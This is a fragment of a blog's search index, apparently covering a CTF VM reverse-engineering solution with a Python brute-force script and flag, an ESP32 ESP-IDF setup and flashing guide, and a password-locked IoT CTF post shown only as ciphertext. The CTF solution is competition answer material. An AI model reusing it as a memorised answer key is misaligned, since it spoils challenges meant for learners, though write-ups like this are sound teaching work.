0x1F99, 0x1F99, 0x0306, 0x0007, 0x0007, 0x0007, 0x0306, 0x1D4E, 0x1D4E, 0x0007, 0x0007, 0x0007, 0x0000, 0x1D50, 0x0000, 0x1D4F, 0x1D4F, 0x0007, 0x0007, 0x0007, 0x0008, 0x0008, 0x0306, 0x0007, 0x0007, 0x0007, 0x0008, 0x0008, 0x0008, 0x0007, 0x0007, 0x0007, 0x0008, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x0008, 0x0008, 0x0306, 0x0007, 0x0007, 0x0007, 0x0008, 0x0008, 0x0008, 0x0007, 0x0007, 0x0007, 0x0008, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x0008, 0x0008, 0x0306, 0x0007, 0x0007, 0x0007, 0x0008, 0x0008, 0x0008, 0x0007, 0x0007, 0x0007, 0x0008, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x0008, 0x0008, 0x0306, 0x0007, 0x0007, 0x0007, 0x0008, 0x0008, 0x0008, 0x0007, 0x0007, 0x0007, 0x0008, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x0008, 0x0008, 0x0306, 0x0007, 0x0007, 0x0007, 0x0008, 0x0008, 0x0008, 0x0007, 0x0007, 0x0007, 0x0008, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x0008, 0x0008, 0x0306, 0x0007, 0x0007, 0x0007, 0x0008, 0x0008, 0x0008, 0x0007, 0x0007, 0x0007, 0x0008, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x0008, 0x0008, 0x0306, 0x0007, 0x0007, 0x0007, 0x0008, 0x0008, 0x0008, 0x0007, 0x0007, 0x0007, 0x0008, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x0008, 0x0008, 0x0306, 0x0007, 0x0007, 0x0007, 0x0008, 0x0008, 0x0008, 0x0007, 0x0007, 0x0007, 0x0008, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x0008, 0x0008, 0x0306, 0x0007, 0x0007, 0x0007, 0x0008, 0x0008, 0x0008, 0x0007, 0x0007, 0x0007, 0x0008, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x0008, 0x0008, 0x0306, 0x0007, 0x0007, 0x0007, 0x0008, 0x0008, 0x0008, 0x0007, 0x0007, 0x0007, 0x0008, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x0008, 0x0008, 0x0306, 0x0007, 0x0007, 0x0007, 0x0008, 0x0008, 0x0008, 0x0007, 0x0007, 0x0007, 0x0008, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x0008, 0x0008, 0x0306, 0x0007, 0x0007, 0x0007, 0x0008, 0x0008, 0x0008, 0x0007, 0x0007, 0x0007, 0x0008, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x0008, 0x0008, 0x0306, 0x0007, 0x0007, 0x0007, 0x0008, 0x0008, 0x0008, 0x0007, 0x0007, 0x0007, 0x0008, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x0008, 0x0008, 0x0306, 0x0007, 0x0007, 0x0007, 0x0008, 0x0008, 0x0008, 0x0007, 0x0007, 0x0007, 0x0008, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x0008, 0x0008, 0x0306, 0x0007, 0x0007, 0x0007, 0x0008, 0x0008, 0x0008, 0x0007, 0x0007, 0x0007, 0x0008, 0x0001, 0x0001, 0x0007, 0x0007, 0x0007, 0x0008, 0x0008, 0x0306, 0x0007, 0x0007, 0x0007, 0x0008, 0x1E70, 0x1E70, 0x0007, 0x0007, 0x0007, 0x0000, 0x1E73, 0x1F27, 0x1EB5, 0x1E79, 0x1E79, 0x0007, 0x0007, 0x0007, 0x0000, 0x1E7C, 0x0000, 0x0000, 0x1E82, 0x1E82, 0x0007, 0x0007, 0x0007, 0x0000, 0x1E85, 0x0000, 0x0000, 0x1E72, 0x1E72, 0x1E83, 0x0008, 0x0008, 0x1E84, 0x1E83, 0x1E84, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x1E7A, 0x0008, 0x0008, 0x1E7B, 0x1E9D, 0x1E9D, 0x0007, 0x0007, 0x0007, 0x0000, 0x1EA0, 0x0000, 0x0000, 0x1E71, 0x1E71, 0x1E9E, 0x1E7B, 0x1E7B, 0x1E9F, 0x1E9E, 0x1E9F, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x0007, 0x1E7B, 0x1E7A, 0x1E7B, 0x0007, 0x0007, 0x0007, 0x0000, 0x1FF4, 0x1FF4, 0x0007, 0x0007, 0x0007, 0x0003, 0x1EC1, 0x1EC1, 0x0007, 0x0007, 0x0007, 0x0000, 0x1EC3, 0x0001, 0x1EC2, 0x1EC2, 0x0007, 0x0007, 0x0007, 0x0004, 0x1FED, 0x1FED, 0x0007, 0x0007, 0x0007, 0x0003, 0x1ED5, 0x1ED5, 0x0007, 0x0007, 0x0007, 0x0000, 0x1ED7, 0x0001, 0x1ED6, 0x1ED6, 0x0007, 0x0007, 0x0007, 0x0004, 0x1FEE, 0x1FEE, 0x0007, 0x0007, 0x0007, 0x0003, 0x1EE9, 0x1EE9, 0x0007, 0x0007, 0x0007, 0x0000, 0x1EEB, 0x0001, 0x1EEA, 0x1EEA, 0x0007, 0x0007, 0x0007, 0x0004, 0x1FFC, 0x1FFC, 0x0007, 0x0007, 0x0007, 0x0003, 0x1EFD, 0x1EFD, 0x0007, 0x0007, 0x0007, 0x0000, 0x1EFF, 0x0001, 0x1EFE, 0x1EFE, 0x0007, 0x0007, 0x0007, 0x0004, 0x1FF7, 0x1FF7, 0x0007, 0x0007, 0x0007, 0x0003, 0x1F11, 0x1F11, 0x0007, 0x0007, 0x0007, 0x0000, 0x1F13, 0x0001, 0x1F12, 0x1F12, 0x0007, 0x0007, 0x0007, 0x0004, 0x1F1F, 0x1F1F, 0x0007, 0x0007, 0x0007, 0x0000, 0x1F21, 0xFFFF, 0x1F20, 0x1F20, 0x0007, 0x0007, 0x0007, 0x0000, 0x1FFD, 0x1FFD, 0x0007, 0x0007, 0x0007, 0x0003, 0x1F33, 0x1F33, 0x0007, 0x0007, 0x0007, 0x0000, 0x1F35, 0x0001, 0x1F34, 0x1F34, 0x0007, 0x0007, 0x0007, 0x0004, 0x1FFE, 0x1FFE, 0x0007, 0x0007, 0x0007, 0x0003, 0x1F47, 0x1F47, 0x0007, 0x0007, 0x0007, 0x0000, 0x1F49, 0x0001, 0x1F48, 0x1F48, 0x0007, 0x0007, 0x0007, 0x0004, 0x1FF7, 0x1FF7, 0x0007, 0x0007, 0x0007, 0x0003, 0x1F5B, 0x1F5B, 0x0007, 0x0007, 0x0007, 0x0000, 0x1F5D, 0x0001, 0x1F5C, 0x1F5C, 0x0007, 0x0007, 0x0007, 0x0004, 0x2002, 0x2002, 0x0007, 0x0007, 0x0007, 0x0003, 0x1F6F, 0x1F6F, 0x0007, 0x0007, 0x0007, 0x0000, 0x1F71, 0x0001, 0x1F70, 0x1F70, 0x0007, 0x0007, 0x0007, 0x0004, 0x1FF6, 0x1FF6, 0x0007, 0x0007, 0x0007, 0x0003, 0x1F83, 0x1F83, 0x0007, 0x0007, 0x0007, 0x0000, 0x1F85, 0x0001, 0x1F84, 0x1F84, 0x0007, 0x0007, 0x0007, 0x0004, 0x1F91, 0x1F91, 0x0007, 0x0007, 0x0007, 0x0000, 0x1F93, 0xFFFF, 0x1F92, 0x1F92, 0x0007, 0x0007, 0x0007, 0x0000, 0x0000, 0x0001, 0x0086, 0x0006, 0x0007, 0x0088, 0x0008, 0x008C, 0x000C, 0x0012, 0x001B, 0x001C, 0x00A0, 0x8022, 0x0023, 0x0022, 0x00A6, 0x0027, 0x0029, 0x002A, 0x8029, 0x00AC, 0x802F, 0x0032, 0x0033, 0x0037, 0x0039, 0x003C, 0x803D, 0x003E, 0x00BE, 0x0041, 0x0043, 0x00CA, 0x004F, 0x0053, 0x005E, 0x005F, 0x0060, 0x0062, 0x00E4, 0x006E, 0x006F, 0x00FA, 0x007B, 0x007E, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0072, 0x006F, 0x006C, 0x0065, 0x0061, 0x0050, 0x0073, 0x0057, 0x0064, 0x0074, 0x0067, 0x003A, 0x0020, 0x0043, 0x0066, 0x006E, 0x0052, 0x0069, 0x0070, 0x0075, 0x0079, 0x0068]a=[] for i in range(300): a.append(0)c=a+b #模拟v4h=c[0x1f9f]print(hex(h))t=c[0x1fbe] print(hex(t))#func1for k in range(0,127): a[5] = k a[1] = ROL(k,1) a[5] = a[1] for i in range(14): a[1] = ROL(a[5],1) a[5] = a[1] #print(hex(a[5])) if(a[5] == h): print(&#x27;fun1:&#x27;) print(hex(k)+&#x27; &#x27;+chr(k))#func2z=tfor i in range(27,127): x = ~(i|i) &amp; 0XFFFF xx = ~(x|z) &amp; 0XFFFF y = ~(z|z) &amp; 0XFFFF yy = ~(y|i) &amp; 0XFFFF p = ~(xx|yy)&amp;0xffff if((~(p|p)&amp;0xffff == h)): print(&#x27;fun2:&#x27;) print(hex(i)+&#x27; &#x27;+chr(i))#func3for j in range(27,127): if(h== ROL(j,1)): print(&#x27;fun3:&#x27;) print(hex(j)+&#x27; &#x27;+chr(j)) flag：NSSCTF{Pr0_ReVEr3Er_F1n1SHeD_We1RD_Vm}","categories":[{"name":"WP","slug":"WP","permalink":"http://example.com/categories/WP/"}],"tags":[{"name":"VM","slug":"VM","permalink":"http://example.com/tags/VM/"}],"keywords":[{"name":"WP","slug":"WP","permalink":"http://example.com/categories/WP/"}]},{"title":"esp32初识","slug":"esp32初识","date":"2022-09-25T16:00:00.000Z","updated":"2022-09-27T13:10:09.127Z","comments":true,"path":"2022/09/26/esp32初识/","link":"","permalink":"http://example.com/2022/09/26/esp32%E5%88%9D%E8%AF%86/","excerpt":"","text":"准备硬件： ttl转usb,杜邦线 ESP32-WROOM-32D 主要组件 基本介绍 ESP32-WROOM-32 基于 ESP32 的模组。更多详情，请见 《ESP32-WROOM-32 技术规格书》。 EN 复位按键。 Boot 下载按键。按下 Boot 键并保持，同时按一下 EN 键（此时不要松开 Boot 键）进入“固件下载”模式，通过串口下载固件。 USB-to-UART 桥接器 | 单芯片 USB-UART 桥接器，可提供高达 3 Mbps 的传输速率。 Micro USB 端口 USB 接口。 可用作电路板的供电电源，或连接 PC 和 ESP32-WROOM-32 模组的通信接口。 5V Power On LED 开发板通电后（USB 或外部 5 V），该指示灯将亮起。更多信息，请见 相关文档 中的原理图。 I&#x2F;O 板上模组的绝大部分管脚均已引出至开发板的排针。用户可以对 ESP32 进行编程，实现 PWM、ADC、DAC、I2C、I2S、SPI 等多种功能。 更多：[ESP32]ESP32引脚资源分配与使用建议_清凉简装的博客-CSDN博客_esp32管脚分配 ESP32-DevKitC V4 入门指南 - ESP32 - — ESP-IDF 编程指南 v4.2.3 文档 (espressif.com) 环境win10 esp-idf4.3.2 注意：ESP-IDF 和 ESP-IDF 工具的安装路径不能超过 90 个字符、不能包含空格或括号。 2 安装 ESP-IDF 工具安装器后，在esp-idf路径下通过命令提示符安装以下工具.\\install.bat esp32(默认情况下，Windows PowerShell 不会从当前位置加载命令。如果信任此命令，请改为键入“.\\install.bat”)3 设置环境变量运行“开始”菜单创建的 “ESP-IDF 4.4 CMD” 会设置好环境变量，或者在esp-idf路径执行export.bat设置环境变量 搭建编译固件esp-idf官方文档有个hello world工程。复制出来 切换ESP-IDF 4.4 CMD 工作路径 1cd [拷贝出来的工程路径] 设置“目标”芯片 1idf.py set-target esp32 设置成功会有如下 设置环境 1idf.py menuconfig 可以通过提示符设置 Wi-Fi 网络名称、密码等，hello world工程使用默认配置，可跳过这一步。 编译工程 1idf.py build 编译完成后会有输出bin文件的路径等信息，以及一些命令提示。 烧录固件到板子 硬件连接： 5V-5V，TXD—RX，RXD-TX，GND-GPIO0，板子不需要再连接电源。 打开设备管理器，查看端口号COM8 按下 Boot 键并保持，同时按一下 EN 键（此时不要松开 Boot 键）进入“固件下载”模式，通过串口下载固件 1idf.py -p COM8 -b 460800 flash 安装结束扒开GPIO0引脚 串口调试： 这里需要把板子的连接线从GPIO0连到GND 打开监听器 1idf.py -p COM8 monitor 更多串口调试： esp32串口的使用_哔哩哔哩_bilibili 擦除 flash ESP-IDF 支持擦除 flash。请运行以下命令，擦除整个 flash： 1idf.py -p PORT erase-flash vscode开发环境搭建Vscode搜索安装espressif即可 ctrl+shift+p 运行ESP-IDF: Select where to save configuration settings设置配置文件的存储位置。 ctrl+shift+p 运行configure esp-idf extension 选择这个然后安装即可，如下配置完成。","categories":[{"name":"iot","slug":"iot","permalink":"http://example.com/categories/iot/"}],"tags":[{"name":"硬件","slug":"硬件","permalink":"http://example.com/tags/%E7%A1%AC%E4%BB%B6/"}],"keywords":[{"name":"iot","slug":"iot","permalink":"http://example.com/categories/iot/"}]},{"title":"某iotctf新生赛复现","slug":"某iotctf新生赛复现","date":"2022-09-25T16:00:00.000Z","updated":"2022-10-17T09:47:12.263Z","comments":true,"path":"2022/09/26/某iotctf新生赛复现/","link":"","permalink":"http://example.com/2022/09/26/%E6%9F%90iotctf%E6%96%B0%E7%94%9F%E8%B5%9B%E5%A4%8D%E7%8E%B0/","excerpt":"有东西被加密了, 请输入密码查看.","text":"47b49a4a2f06ffaeeb6d37e9691a4c66f63ff4446f79fd1f5ecd8d03847f2564b21ad1fe86c5c010bb0fde8494da3ab5ac29e39157d3e13adcb6d8fe56716b5d646ef9a6add8a453e1a12380ffa90ba3a19f49d7f4bcdd1a52e1bf53d2370be0f1bc30339aa32dfd8bfd681671e224bef690edce0f16dbc069d96ee5de89bb74f295e677d9c722a3f1d1202308c44eb6b739ec0d841897ba081ef6663c66bbbe1c6299d472442326f7b832f599f9391b7c5814f03ec8540ad9bc7a7832c7cc39fcb42fbba85fda7aef3ef7f33ae784cb4482630b301211649b21f888c92f488f583e4faf9bfb3b7b737c3b1784ac03b7fc2982a447cc6b8df40bb5e87b434feda6a26f0c729dbec242b4529662ed30b0d68e65f3d502b6ed4eb6842b6e2823b65f877198e3fc064750b1aba405af81b50c0fcd3461533541f940b35bbdb87c6ddd33055ed3b028cd30a06b0ff3facbfa836268af95dc64eb043504e4f190cedb1d434355c68ec2a710e051baafc999bcd4cf5b3bb8f43c3379c5185f76c206ce7d76d90f7aacbf92eea321c16e5d0847ce0c02dde3eba6bc3782e77d0791d9345fda3f8945cebec186a274f648cd6b4a52a8e30b414184a01f54a1f6cdb5f52c8503b7ee3e471741d6acaa3db885571b4b4aee736313cdf8b8727212ed619a818bcb5d83b047dcaae8d32762b3e39d647a007d95f3f6203ae303d8e9b103dc96c2d49591e53cf41e7952fd3ec293c65a4079ee389300b063cb6d77332b31bcb34524529f032e8d6091b4e441868ec5b215d5c6772ab239aa036a70d3142f6c960d37095497fee087a40500cd3da75ca7ed99723aa9a980fbdd6f5f6a6a6ef8a6b92218bb00939a2215615d654289a63be428ef5d4a3f733e37ffd76e3e35410d404cfc49862c4753440231c4ad1235640b95d2cc52efb8443d6a2a79c03a89a91130026a9505d0617a8366bae64b2c7ced3166de9d46bc473414ea8ef9db072753e9d95e50ada7fb4b30fbf6c2b90a31b531c7af6cce880359a93ab324330d3490fb45afaf44695c98e585d63666d6cbf03126d32f2e9ac113a7f29aa5a37737afd094428e8bb4e5292c8b194b4267b97e39d463d0b859f22d605d8c28d35b660ea6c19b1e795071f47f008e18e67d1f7f7355a4877e92f1ced522d8ac5195654b08246f77c34b91595dd6aa3c9457c71bdbc263e239ea92564d3d73b506329a967fa15380197c5de066c03ffcafa007a20dae83df3a8e9171dfc1bd2df64a66e1a632f87906b2eb65154e5cadc794b7d11b2713e6602ca0f5801680f7f3a643a43cc72524f3784f755f382ebf0bfe2b09ceb6c92b2c7b3a3f46c1935a42066c809899c9e8b14f988ef3d368c0066a651d165dd4a48a5828f55de62f053e9c4beb4626b3fcacdd583d9b411f99a51851eed2c3cfb3d8bb323d2e288ff0330a1adb8e7a84ebaa058821b59798cbbc68f6fd9c9f01604ec63b476e3ab7235ff9cb47e3adb2e7c66123af5d69e82d169fec162a6dee6daabd28c624aac6fb03fc7edfb73d1466717e4c42b241a41e9e147dad9127571ec7bf4a0468420dc030d6d7a73c5100b956b8a5950ec26d3369fce5de5e9323514b7f060033268900aeaef587aa16ed2e3e338736fdb4c6ad201a0aa9539739839a5e1c8290a60900d6ba86da7939a6b48f2f0a6926b24aa2c7cce82a8cb30e521958f97a5d51b223befa98c3932c0043e2f28bc29c82d35ddcf3457146c63439f5134ec1fd477dd5e423b5f1c89f82e780ea04a6b039e28f1ec641dc75d16feacefa46f6533e7479e50ebbd18fea05a0346847d6fa85d5b41f971b2e874d09b1712292b7499abf7a2f9a6e76cfae29c9d39e52de2a78159973897b8721006f766bd28d3a5dc37b0aa24400cd5a03ecb6eb543b39123f4629a255d5aafaa2547dea943157bd899d7c6098a31e58d551ba2f6fddfe2e09102507b49a69daaf43893b39500549e22bb5b447a0e60ded2be5f180b15732ff686283e2b7a2cb3a4d8988f3754b961bb32d585d0e91e8c3d3ee8423eb84f54d7971db1922dbe4623319407f226b87b118dcf881205334cc31cb1b6429a87499ec77537e8235e2478671b46fc9dd018566bfbdac5e08d2146e9e4dd613c26deb373847df6624546db66e968450acc6a741a9096be66616c7e3260c9845744eb62e27906fb2cfd51ea1e813d16d012edc5ae1ed8009ddca367bd941bc3bb8ce041b2e7d8f5f1cc6a63b66bd777a10757bd680f5e3662dd4f7e5aade891d2b87009557d63dc04e200f20df751469b5dbb4dac2e8a9a97ff6c02b958523c01872258424b55b248dcf83e608263e57e6f6fe6dc0362c7201da621c381d08404bb3e2d224d3211a86bd9b4a2108c4770677d382b9a14f97256ddb7c08c97a8a070b6560cfbaccbfd330a865ebf55f4a49ea50a06b516526fe876a97f6a39eee488b81a7f2428fa5d45289c305f0b36ae99d297a1c14b475ddd0d57253ba7a28a55ef51cdbc0a978c18547e822a5b6a24c3d8709b9dbc4bc24e4ddb033bf9009a83963bbe3ad747ed8299022dc744a81c7e37545079bd6a8833744d96c5c8a4d1f32ca913c7397d0bd0cce6c6311638729b90dcadf5fb7635f5e2d1d159bbd62f2c551a3f0098cb5a4bbc5606b393f19573896256fc6e8bcf4d5d522894e09e662fa9ba376e47a99f3ab1800efa4f4470ce7e5b5c922759de42651c5ed1f4ee665a531fab0439c41a6c64ecade9b08343ccccbcfc3f7237fed3ebab6185a6749094f084576a28d656eca9e173f609b31bd59593f9af20c02f018b836643ac3696a0924bbb3c5243d8894570d7016aae00e4381968032d4b6f7f9681ce43688de0e8a66a1260c93e1734523b4af65d5e1199603bdead54d9dc51ce91319287d08c9f3fbfe4f12e3186a8aeafd60dc9dad74d4868b567951c692da264a16bc487501949a0f7d4c88e492335ef06b1b4ee5a02505cd994f17c7ee63b9ec3b6222868333dab092615586f0c8551404d36d380c8234764af60f05bd3dd1fa647f670516b4fe2f3c22f34efca89aa486c20b74414977b406378986de1be358e6447319554d3473732f9a30ea218d44520cd20420358ed2c39fbeb07a5fa0b594d5f79ec47adf47c9b45f956f9b2b2dbcc11352c8faab506b70bf90ce8a36a59482024d510250ccb78a520d81832ffe48d14f5667abbc549b519a51ffa2a3f70a12f2feb2bcfbc8b907c741695c5cc7d69e9045a606c0032c1f1bc0daddfcbe9027bcdc25b10c43861e5f769a534aa207f8a06870e26c4289f85339bdd0843acafc8757c25a886259336e7a994b158fdc926bccc6e0847fa4168e8c5e08f976427ce5699c06deeb4718421054f839efc2867d079409beaa99411391c467ea9cf5b9054d9fab000d7d2f4903a048bf35bab8c9f8f7b18e0bf24eabc46e8ca0f45fe395a1fd77e97d558ec4d9deffc3734ee31d69e450a0d0e77a08f7e1e3800c370b2d01375fe047a0966d156e182cdaa6ad2ff6bd67cc5538a34547e7c04e314c7887167da94312cf445019a25a1a2563ed7c2afd850c256dad3f645ff0b58c3f862f795550198e4fceee52a52d24aa341c0d297b3361552c4439dd07ea17afa0bfeb0a4fe08420e05c78a7ddf70da8bf40f743ec08bce3808b9b8a6c79c307c24a289ef31936cba004428a7de0218ffa9889b462441f5c8850318437d6829924eabe16417577724de1a8048e66938cd657a38ac31bc90a2bb82b603642c126d16c922de9f4d141f28d521232eed62a9bf82c4197a7eaf075c85980a8e03cd64cd9804f6c1aa3c795923e2a7c4d394135e534d49a33fb87dcd26365702a691c4be69fbd97b8966616af7bae998af985262d4b441668bb7a81f50f38879c6dbe279458c6e09dc0b3ab983dabba7ea7bfde5a2985bb110bc6ea6cdaac59d199e827d100fcfef62cbdd88649cb72e5efde3c7a12301eb54856bb3037e0243278bc45b6114873d905a07beb8b6b60a3298a34f7c78438a69cc38288762c3018a6cc3c4f3a87528484fcfd3ab9d69c3817af3d6f0528206a7783ef32b617760defbc5d1ad6a46169ea91e8a0c6b65b6ebed7206cf2841d98cb81b6df0a65cb11f800e992d300b05720cde5a56d1a7655e9d78c968ecf4d2f48b4c0fd14f7ce28e383446c5ec0016c839a609014ab07d05ab73c6eacaaee91b44d91775cc699105531998acb3487a5e2119c57c9d1c7bdb84b9afd8d00f38b1453d5a8932b8713fa29283934847f3f04d854388065fcd7b549edb56dddb467ef46c41f13408cdcb65ded03b06f96bdb404978a622e2371d5415aa49cfc44558e29057df190652c2318f2ff41e36926ddfaca602010f560a07e55e365ce2a422b27f9ab2473f7aaa44ccfe1fef4f7d2c630dcb608588cd5316c6a7ac1c8d004f9a0b66484bd02220c20b4904f2fe2af4db99d922c95c431d497bd70e4d920f31625fac8b4b60c3e89f72f444010c625b75f185693c6e510b80bb73e767c403694c510b5fef26ced34c7a241c00bee13fb2d1d6378cf25248c8ac9bd49d23c65fab37fe507b9cfbc45d5d990cee915762caac314d7ac5444a994652005f7c5c6210e1acde19b53653e67b45395d30504463f18054347fe16073cc258096616e2812e2c3102877ba1d78c29f2f387b5723aa44db3f10ce032df1df7b08bb90223a22543ebfd5719aaa570a2da91a2d29db4d77e90336719fda6c7f82f90b06350a25c81d812a1cdad5e81ae9f0e562e893880fdc2ea4f9dba6c563c9c5f086b39108586bb1e85a97e69de27b098862f007bafa344cd440a76a2bcb121a2b67e0c0a4aaf4958ad7993d0779293360fd637b907a11440320ede670c5e388e97373af6b3cce9cffa6569a5010c102cd5f716a407034a62e36987cfe7d6b62d9abaddecc7964861b1d6c6a3413142dc390bc29f14dfd8f59af151bbaf2cd08dacf4791aefacd8d724e8ac525e60656834f287d2b2b55b2c4167362620a4dd07423cddb70d22b8a873d6a0b71a212c7582443d09055de5c2222f3b4bf043e9ac0172d3263dda0b21ea85e0de21573e7aa8ff9f525b9964922273488de7a29f25e49671c7ea9b98ef1e4e0ed6b90b8f6e1488da240356b3183e3bee074004627d42eca7a6e5c0f46fb49a55fe708898c613f7b06672a70f719faa356a3569fbaa825c60bea24eb1ec7b572c436969664d1f2b3a54b0c73b94013df6dd1cf66897671bb5c7687ff957ccb65732e1e6e662746ed29cddea4cf1c9f3555a7331a9c30694deb256f5c1960685b54dd9c3ab673625b58f8577402519eab0fb003566ffa4caadc58dfd16f8e152bbac747b1d7acd69755e8a25580e04de18d286b38cf1878575ae47991c0a10e401a4bb6245fdf3978b6cb26174ec6117c29774913a873216d9aa52eb4836b7987d9a8a43c6a67c572f6f5e24ef04210fc2e4847ad30fdee0e36a93f78c55a393614e8c2c0a5568a1623e5a0bc33efde719a89f0e506bde8e346643ec348b58361eebaa6255e47501f592b400f8f299ef512dd0ac869b116e100ae7c2a82b05040adc1cc4ab4e52cfc51a4e3b6f78914f9d978291592688a735308c3986342a4862140a060c8efaf29d4b467d4f24416f6202a4035489248eb37fb1743d54bdb841f3c90f9e324c09e38ebcd875a692394cb948a3939ad1bde4af55d9d4f7b210b158c1470a555d1722f9977d879ef06abeac680a5d63ca0086682b514113aec7f6175ab0e5d35df24f823232b8d5fbac80c9faf451b12e27efb2e551a6607876055baec473ff3b9807a72a46a6cee4208ff967c769b5f4dbb91694875704566e51bea5960b7ee78f2c25bc52b7c201750792a89e784f489d8f0d1afdaf115721cd5886d4d99b1994873144b1387caec700952a8b96435fb918713ee6a634a6b0150ea107c0acc058e451e79743b11cc3ea8c3795e86e91d6e30a37282eacbeec5e7d13e97d87b0b9947da0abde4d852216fdbbf76bdad3ac09f4010fb844e95a168a06ffb4b3ba82f7ff886c02dc36a4208efbbc02ee5b947eca0af5b0050003890d63a205201fc71e9359f020ecfbf769802059de061efe6a699ada5101dc9c7cbf001c582e6893d91933f2477debb811ce557b15cf633788eeeec361be2ba3a68d5790bf449bfd188692e24fb06b42665e3b15be203334bc07bf4c3dc003485a87816eeddf57b10ecb5ecb12dadddcebd825fff20faa992315c83985975287bfb539780ec243ee93846c4a1c82f0df59b2fe4a51e17ce85c33ca049ade701ce8bd4d359c2abacc6eab11f30d0accd0103c776c6142349e497e87d300260644d2ad3d5bcaa1de54e5b100f119a3079bb74e76393b6a45afdaecd64598a39e9f8f2d9da3e476dfa9ebb48b75011111a86b88882f6304039b8b2fa19e424e75883ea7e36e5fb05fa9adfc743be87425f22a81caf644d026c4a58839ad4c424e92ea58b2ce4a9004fcd3728a7d54be9d17fed5652f895b88527b0f3c3de731eb9846afd0a3bf070306300767923baa588d6f53963dd816571d2ce5b3d3a60f53eb01b979c117871202dea22fc13dabe1256201c4a53e3048aac54beb9babe0eb1ee7f342a6eb532551d75a9fd0ccc7028e39a4f38e41882d3c52a80baf8fcfde5c172aecef2a57f351622d687067079f94f490152a30bf64603d4d72ca3e30e53ca3f857e6a78f4c7d4e9d42fcd09f03caa46ff7168d36ca3fb52f205d35d8768dc8718b3dc55137722871c1d8331f895a29abce335b4d8753231c0e27359baf17fa3c07b3a13eb5a637f840d3f30c7485f364a8bdaf797199dedc5f39f453ac43449f6cdc19f2a3df1a039de1f8781165afa85810a2dd8f699d1dcb28fe1ddfb7415746d2415cc68108cb15a59fae254abc74d985c430f29c166ea0f90c0d4711cd54ec1f696a6cc3fa8c5192d3b74969cb6a9d0bbec012cbc99ca7d9d3e1acadae56664c8f3d7f4e7044c3fa4d7ebfc204de2f37399cd0ac52c5618d5e4ff00c49eeeda160212e54a153ee36756cf618c4ee1b96f3876a19a31b10eb20b71c1407290f3523f7a6682afd2cdbf86acb1dec6c5f874599459a29daebfb1a5d65cb8d5bcda02ad327c6cf87de4b199e2a37ba6512304563223787c5679707f5ee5af5e10196e5a35d0e9003bb21564caf8225a8bf34b82bbe8055470f3a3ced6e9f9251830d06b07c5d00fce4c61f52401a91a2b0a46f5455918356f279f777014276c5e800da15f0372ab5f1f5a69417ccc151d7a754d345098b17fafb8f92c5e902eba8f9a9ac680a3ccb0167a77937c51d3560699647c8407e86e7127c5a44740b978ff4413aae7499a508c14f06873049cfd87882eeb136b60f03f772e3c12fde0faee68b80b9c6391329a76967940a9e0ebf3bc25e1e50b9b4ce0a8679ddfd06d7ecb5bff00b5433ec8293bbacb1fbf77c6308ce792028e6f2ed4215f2e24c9e2fbf015025197c32746c84fc7180b9e4c6e77ab2d34f5feba00fd9fecef120ac9755da1da7c03f600cbead067025e31a4afafa227247ec04559aa3ecb3c57b976a2cec571ba35b3cbf3c788b5afd511f1c066d1b71c8eba4c47e688bc6c4c091ce5feee8931a073fdff93b93a80d2d578f8a756c21c8fb2b44899194f3ce5fec49ebf50858b13949b87afb147564942cedeb1c4bd47e46309085d18e5877bc269e750f785b66840b4d2cc6020cf2155ae484439ee58ec96d8c4e8c154c6b90927c6f117bc8bed171437773fd1a29269d4e57e95d702d70f1100210b72bc1bab53aac58d6d81469027422b3f2a4e29c4cb6305702697e5f8b0bfd47bb5f3d8b32203789f3a91b251a9fa0c30303c58996138df98dffe1270a52ef24408ab287907c0d758d08a72ea5a032c3e656962ea70daf0ad1c808bf5e370ac57dd32a59f9298e240eb3694cf473d3baf2be2c54cb413d430b6dbb4f56903fb849d4c26421e93db63d1663f8b86052a6583a7d1eed54c87bb4c586eb3d53d772c4824c6e3e4a03d3c75a139d08d3823d1d3f66462e092d69021bdaf3547b7b5237eede500bf80787b4d95e2a54d6f5f48bffa179c1f2079c20a9b40b4095a94e8fb8cfc57bfd38ba5d92a2b1233b32807b57289f54a3a1ac4ae6c4a7b7450c81dd6a09cb603c479168196f0d36149fe4c3dd5af0e9f78f44725d89cc0c2bb5fb263f6ac6d17f33c9c37552c2c9d7f24d7f9e647071f2a4013a08d4e26d458c7276b3210b7b54f42cbd72934514ad8ed960c71ecc73329fba91ae3f8d74afa8a82d435a95f9dd8d9305fba68707fbf455db3bb015a50c08a989dd83d2d59889f1e515ce8db1e308b415863b2fc8f09f324b290f7396c03d36e5dcbc835ee1a5db120b40bace877db30847a25840bc45bc131d568576c761539f9d57ee72f70b26c30ff7648fd9be589da9ac5a092fac0511b2db9cb206015c3188fca996556fbc2a077260d026f0204474700e7ef736b0f5abcdb16882a47691fdddc93e232a63703da94481327f95188dd31e4c04f9d617802b58cc771e8ad165cc6de8c34512de9947f12aa689b4b20832650c21edcd7ca2f542c67ff0d71684b8cfd09d631796cd96a543f16fd9fc91afdbeda44685f4b9815169cdf7383e9a71af6781ca2a8ac99ceafcbe6b4748b1b6d0223c9e8aef6aa4957bd988b454f0adbbe86c9e3fc3dade18ef41b9ffb2d17725c20ca0575bf88e1ffbee4da0b787e07675827681c19ab97225102b5b1195995a0afc62c5ad51ccc8fb91888628fcf66138f9e4e65893b52e